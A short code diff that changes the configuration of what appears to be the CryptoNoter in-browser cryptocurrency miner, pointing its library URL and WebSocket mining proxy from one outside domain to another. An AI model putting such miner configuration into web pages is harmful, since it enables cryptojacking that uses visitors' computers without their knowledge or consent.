@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://kekullu.com/lib/",
-    WEBSOCKET_SHARDS: [["wss://kekullu.com/proxy"]]
+    LIB_URL: "https://smtl.me/lib/",
+    WEBSOCKET_SHARDS: [["wss://smtl.me/proxy"]]
 };
